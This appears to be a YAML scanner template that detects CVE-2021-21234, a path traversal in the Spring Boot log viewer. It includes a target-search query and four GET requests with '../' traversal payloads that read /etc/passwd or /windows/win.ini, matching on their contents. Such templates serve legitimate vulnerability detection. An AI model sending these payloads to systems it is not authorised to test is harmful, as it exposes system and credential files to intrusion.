name: spring-boot-CVE-2021-21234
manual: true
query: product="SpringBoot" || company="spring.io"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
  r1:
    request:
      method: GET
      path: /log/view?filename=/windows/win.ini&base=../../../../../../../../../../
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
  r2:
    request:
      method: GET
      path: /manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"root:")
  r3:
    request:
      method: GET
      path: /log/view?filename=/etc/passwd&base=../../../../../../../../../../
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"root:")
expression: r0() || r1() || r2() || r3()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21234
  - https://spring.io/projects/spring-boot
  description: Spring Boot makes it easy to create stand-alone, production-grade Spring
    based Applications that you can "just run".
  tags: pathtraversal